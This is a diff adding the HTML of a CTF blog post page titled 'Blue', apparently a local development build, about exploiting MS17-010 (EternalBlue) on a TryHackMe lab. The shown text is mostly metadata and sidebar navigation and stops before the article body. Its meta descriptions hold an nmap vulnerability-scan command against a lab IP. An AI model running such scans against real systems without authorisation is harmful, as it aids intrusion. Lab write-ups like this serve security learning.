@@ -1,0 +1,2409 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="no-js dark">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#76B900" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#1a1a1a" media="(prefers-color-scheme: dark)">
+
+
+<link rel="icon" href="/favicon.ico" sizes="32x32">
+<link rel="icon" href="/icon.svg" type="image/svg+xml">  
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="manifest" href="/manifest.webmanifest">
+
+
+<title>Blue | .burso | blog about ctf &amp; anything else</title>
+<meta name="title" content="Blue" /><meta name="description" content="Hello everyone, today we look at the CTF with MS17-010 vulnerability. So let&rsquo;s start with nmap scan.
+bash $ nmap -sV -p0-1000 --script vuln 10.10.223.243 …" />
+
+<script src="/js/early/early-init.js" defer></script>
+
+
+<style>
+   
+  html.no-transitions,
+  html.no-transitions * {
+    transition: none !important;
+  }
+  
+   
+  :root {
+    --color-text-primary: #111827;
+    --color-text-secondary: #6b7280;
+    --color-bg-primary: #ffffff;
+    --color-bg-secondary: #f9fafb;
+    --color-surface: #ffffff;
+  }
+  
+  .dark {
+    --color-text-primary: #f9fafb;
+    --color-text-secondary: #d1d5db;
+    --color-bg-primary: #111827;
+    --color-bg-secondary: #1f2937;
+    --color-surface: #1f2937;
+  }
+  
+   
+  body {
+    background-color: var(--color-bg-primary);
+    color: var(--color-text-primary);
+    transition: background-color 0.2s ease, color 0.2s ease;
+  }
+  
+  html.no-transitions body {
+    transition: none !important;
+  }
+</style>
+
+<meta name="keywords" content="ctf, eternalblue, hashcat, metasploit, MS17-010, tryhackme, posts" />
+<meta name="article:published_time" content="2020-02-12T14:35:31&#43;01:00" /><meta name="article:modified_time" content="2022-04-27T15:29:54&#43;02:00" /><meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large" />
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Blue" />
+<meta property="og:description" content="Hello everyone, today we look at the CTF with MS17-010 vulnerability. So let&rsquo;s start with nmap scan.
+bash $ nmap -sV -p0-1000 --script vuln 10.10.223.243 …" />
+<meta property="og:url" content="//localhost:1313/posts/blue/" />
+<meta property="og:site_name" content=".burso | blog about ctf &amp; anything else" />
+<meta property="og:locale" content="en" />
+<meta property="article:published_time" content="2020-02-12T14:35:31&#43;01:00" /><meta property="article:modified_time" content="2022-04-27T15:29:54&#43;02:00" /><meta property="article:section" content="posts" /><meta property="article:tag" content="ctf" /><meta property="article:tag" content="eternalblue" /><meta property="article:tag" content="hashcat" /><meta property="article:tag" content="metasploit" /><meta property="article:tag" content="MS17-010" /><meta property="article:tag" content="tryhackme" />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Blue" />
+<meta name="twitter:description" content="Hello everyone, today we look at the CTF with MS17-010 vulnerability. So let&rsquo;s start with nmap scan.
+bash $ nmap -sV -p0-1000 --script vuln 10.10.223.243 …" />
+
+
+
+
+<link rel="canonical" href="//localhost:1313/posts/blue/" />
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "headline": "\u0022Blue\u0022",
+  "description": "\"Hello everyone, today we look at the CTF with MS17-010 vulnerability. So let\\u0026rsquo;s start with nmap scan.\\nbash $ nmap -sV -p0-1000 --script vuln 10.10.223.243 …\"",
+  "url": "\/\/localhost:1313\/posts\/blue\/","datePublished": "2020-02-12T14:35:31\u002b01:00","dateModified": "2022-04-27T15:29:54\u002b02:00","wordCount":  2605 ,"publisher": {
+    "@type": "Organization",
+    "name": ".burso | blog about ctf \u0026 anything else",
+    "url": "\/\/localhost:1313\/"}
+}
+</script>
+
+
+<meta name="generator" content="Hugo 0.151.0">
+
+<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+<link rel="dns-prefetch" href="//unpkg.com">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <link rel="stylesheet" href="/css/bundle-development.css" id="main-css">
+  <style>
+    :root {
+      --hugo-environment: "development";
+      --hugo-build: "development";
+      --theme-version: "0.0.0";
+    }</style>
+<script type="module" src="/js/bundle-development.js" defer></script>
+  
+  <script type="application/json" id="hugo-environment-json">
+    {
+      "environment": "development",
+      "isProduction":  false ,
+      "debug":  false ,
+      "version": "0.0.0",
+      "baseURL": "\/\/localhost:1313\/",
+      "buildTime": "1760543465647"
+    }
+  </script><script src="/js/hugo-env-init.js" defer></script>
+
+  
+</head>
+<body class="bg-bg-primary antialiased" 
+      data-environment="development" 
+      data-theme="dark"
+      data-build="development"
+      data-version="0.0.0">
+  <header>
+</header><nav id="topNav" class="topbar" data-component="navigation-topbar">
+    
+    <div class="topbar__logo"><a href="/" class="topbar__logo-link"><img id="lightModeHome" src="/icons/light/home.svg" alt="Home" class="topbar__logo-image hidden">
+<img id="darkModeHome" src="/icons/dark/home.svg" alt="Home" class="topbar__logo-image hidden"></a>
+</div>
+    
+    
+    <div class="topbar__navigation">
+</div>
+    
+    
+    <div class="topbar__search"></div>
+    
+    
+    <div class="topbar__controls"><div id="chatTocToggle" class="chat-toc-toggle" role="group" aria-label="Switch between Chat and Table of Contents" data-component="chat-toc-toggle">
+            <button class="chat-toc-toggle__option" data-mode="chat" aria-label="Switch to Chat" title="Chat Panel">
+                <img src="/icons/light/robot.svg" alt="Chat" class="icon chat-toc-toggle__icon">
+            </button>
+            <button class="chat-toc-toggle__option" data-mode="toc" aria-label="Switch to Table of Contents" title="Table of Contents">
+                <img src="/icons/light/toc.svg" alt="TOC" class="icon chat-toc-toggle__icon">
+            </button>
+        </div>
+        
+        
+        
+        <button id="darkModeToggle" aria-label="Toggle Darkmode" class="topbar__button" data-component="theme-toggle">
+            <img id="moon" src="/icons/light/dark.svg" alt="moon" class="icon hidden" title="Dark Mode">
+            <img id="sun" src="/icons/light/light.svg" alt="sun" class="icon hidden" title="Light Mode">
+        </button>
+    </div>
+</nav>
+  <main class="layout-shell layout-density--comfortable" data-has-right-rail="true" >
+    
+
+<button type="button" class="fixed top-4 left-4 z-50 xl:hidden bg-brand text-white p-2 rounded-lg shadow-lg" aria-label="Toggle navigation menu" data-component="navigation-mobile-toggle">
+    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+    </svg>
+</button>
+
+
+<div class="fixed inset-0 bg-black bg-opacity-50 z-40 hidden xl:hidden" data-navigation-overlay></div>
+
+
+
+<aside id="sidebar-left" class="sidebar block fixed xl:sticky left-0 top-0 xl:top-16 z-40 h-full xl:h-[calc(100vh-4rem)] w-80 xl:w-auto -translate-x-full xl:translate-x-0 transition-all duration-300 ease-in-out overflow-y-auto pr-1" data-component="navigation-sidebar-left" role="navigation" aria-label="Primary">
+    
+    <div class="sidebar__header flex xl:hidden items-center justify-between p-4">
+        <h2 class="text-lg font-semibold">Navigation</h2>
+        <button type="button" class="sidebar__close-button p-2 rounded-lg" aria-label="Close navigation menu" data-navigation-close>
+            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+            </svg>
+        </button>
+    </div>
+    
+    <div class="sidebar__link-tree pt-4 md:pt-4 px-4 md:px-0 h-full w-full" data-link-tree>
+        
+        
+        <ul class="space-y-1 pl-0 list-none" data-level="1">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-1
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/" 
+        data-level="1" 
+        data-current="false" 
+        data-parent="/" 
+        data-section="true">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Posts
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Posts section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="2">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/big-ip-f5/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    F5 BIG-IP iControl REST vulnerability CVE-2022-1388
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/racecar/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    racecar
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/ret2win/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    ret2win
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/brainpan-1/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    brainpan 1
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/reversing-elf/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Reversing ELF
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/inclusion/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Inclusion
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link sidebar__link--active" 
+        href="/posts/blue/" 
+        data-level="2" 
+        data-current="true" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Blue
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/borderlands/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Borderlands
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/bookface/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Bookface
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/daily-bugle/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Daily Bugle
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/impossible-password/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Impossible Password
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/citrix-vulnerability/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    How find a vulnerable server on the internet?
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/posts/grsec-patch-size-overflow/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/posts/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    .grsec patch size_overflow
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-1
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/" 
+        data-level="1" 
+        data-current="false" 
+        data-parent="/" 
+        data-section="true">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Index.md
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Index.md section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="2">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/docs/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Academy
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Academy section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="3">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-3
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/conferences/" 
+        data-level="3" 
+        data-current="false" 
+        data-parent="/docs/academy/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Conferences
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Conferences section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="4">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-4
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/conferences/2017/" 
+        data-level="4" 
+        data-current="false" 
+        data-parent="/docs/academy/conferences/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    2017
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand 2017 section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="5">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-default">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/conferences/2017/34c3-tuwat/" 
+        data-level="5" 
+        data-current="false" 
+        data-parent="/docs/academy/conferences/2017/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Notes from #34c3
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-4
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/conferences/2024/" 
+        data-level="4" 
+        data-current="false" 
+        data-parent="/docs/academy/conferences/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    2024
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand 2024 section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-4
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/conferences/2025/" 
+        data-level="4" 
+        data-current="false" 
+        data-parent="/docs/academy/conferences/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    2025
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand 2025 section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-3
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/htb/" 
+        data-level="3" 
+        data-current="false" 
+        data-parent="/docs/academy/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Hack The Box
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Hack The Box section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-3
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/pnpt/" 
+        data-level="3" 
+        data-current="false" 
+        data-parent="/docs/academy/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Practical Network Penetration Tester
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Practical Network Penetration Tester section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-3
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/osce/" 
+        data-level="3" 
+        data-current="false" 
+        data-parent="/docs/academy/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Offensive Security Certified Expert
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Offensive Security Certified Expert section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="4">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-4
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/academy/osce/osce-prologue/" 
+        data-level="4" 
+        data-current="false" 
+        data-parent="/docs/academy/osce/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Prologue
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/f1/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/docs/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    F1
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand F1 section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="3">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-3
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/f1/how-to-fix-f1/" 
+        data-level="3" 
+        data-current="false" 
+        data-parent="/docs/f1/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    How to fix Formula1 or how to make F1 even more exciting sport.
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-2  
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/prielom/" 
+        data-level="2" 
+        data-current="false" 
+        data-parent="/docs/" 
+        data-section="true">
+        
+        
+            <img src="/icons/light/folder" alt="" class="icon sidebar__icon">
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    Prielom
+                
+            
+        </span>
+    </a>
+    
+    
+        <button class="sidebar__expander sidebar__toggle" 
+                aria-expanded="false"
+                aria-label="Expand Prielom section">
+            <svg class="sidebar__chevron" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+            </svg>
+        </button>
+    
+</div>
+        
+        
+        
+            <div class="nested-content" data-collapse-content>
+                <ul class="space-y-1 pl-2 list-none" data-level="3">
+    
+    
+    <li class="flex flex-col mr-2">
+        
+        
+<div class="sidebar__item
+    sidebar__item--level-3
+    ">
+    
+    <a class="sidebar__link " 
+        href="/docs/prielom/prielom-1/" 
+        data-level="3" 
+        data-current="false" 
+        data-parent="/docs/prielom/" 
+        data-section="false">
+        
+        
+        
+        <span class="sidebar__text">
+            
+            
+                
+                
+                    .prielom #1
+                
+            
+        </span>
+    </a>
+    
+    
+</div>
+        
+        
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+</ul>
+            </div>
+        
+    </li>
+    
+    
+</ul>
+    </div>
+</aside>
+    <div id="pageContainer" class="p-4 w-full md:flex-1 min-w-0 mx-auto page-container xl:px-8 2xl:px-12">
+      
+      
+      
+      
+      <div id="mainContent" class="transition-opacity duration-300"><section id="articleSummarizationContainer" class="hidden border border-dotted m-4 p-4 rounded-md transition-opacity duration-500" data-component="article-summarization">
+    <h2 class="text-3xl font-bold text-text-primary mb-4">Article Summarization</h2>
+    <div id="articleSummaryOutput" class="flex items-center justify-center p-4 my-4 bg-zinc-100 rounded-md text-text-primary text-sm transition-all duration-300 ease-in-out">
+        <div class="animate-spin h-5 w-5 mr-3 border-4 border-brand rounded-full border-t-transparent"></div>
+        <p id="generationMessage">Generating summary...</p>
+    </div>
+</section>
+<div class="mb-4 mx-auto max-w-3xl xl:max-w-4xl 2xl:max-w-5xl">
+      <div class="article-header" data-component="article-header">
+  <div class="article-header__navigation">
+    <nav aria-label="Breadcrumb" class="breadcrumb" role="navigation" data-component="breadcrumbs">
+  <ol class="breadcrumb__list" itemscope itemtype="https://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem" class="breadcrumb__item">
+        <a href="//localhost:1313/posts/" 
+           class="breadcrumb__link" 
+           itemprop="item"
+           aria-label="Navigate to Posts">
+          <span itemprop="name">Posts</span>
+        </a>
+        <meta itemprop="position" content="1" />
+        <span class="breadcrumb__separator" aria-hidden="true">›</span>
+      </li>
